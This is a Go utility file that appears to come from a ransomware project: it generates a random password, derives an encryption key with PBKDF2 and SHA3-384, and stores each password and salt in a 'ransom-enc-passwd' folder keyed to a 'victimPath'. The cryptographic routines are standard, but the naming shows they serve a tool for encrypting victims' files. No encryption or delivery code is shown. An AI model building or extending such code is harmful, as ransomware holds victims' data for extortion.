package utils

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/crypto/sha3"
)

// GenPasswd -> Generate a strong password for key derivation
func GenPasswd() *[]byte {
	const passwordSize = 25
	buff := make([]byte, passwordSize)
	_, err := rand.Read(buff)

	if err != nil {
		log.Fatal(err)
	}

	passwd := []byte(base64.StdEncoding.EncodeToString(buff))
	passwd = passwd[:passwordSize]
	return &passwd
}

// ExtractPbkdf2Key -> Extracts a derived key from the password
func ExtractPbkdf2Key(password *[]byte) ([]byte, []byte) {
	const iter = 64000
	const keySize = 32

	salt := make([]byte, 50)
	_, err := rand.Read(salt)

	if err != nil {
		panic(err)
	}

	return pbkdf2.Key(*password, salt, iter, keySize, sha3.New384), salt
}

// StoreCryptoInfo -> Store the original password and the used salt in a file
func StoreCryptoInfo(password *[]byte, salt string, victimPath []byte) {
	wd, err := os.Getwd()

	if err != nil {
		log.Fatal(err)
	}

	targetName := filepath.Base(string(victimPath))
	keysPath := filepath.Join(wd, "ransom-enc-passwd", targetName)
	file, err := os.OpenFile(keysPath, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)

	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()

	victimPasswd := fmt.Sprintf("Passwd => %s\nSalt in Hex => %s\n", *password, salt)

	if _, err = file.WriteString(victimPasswd); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("[+] A password was added to %s\n", keysPath)
}
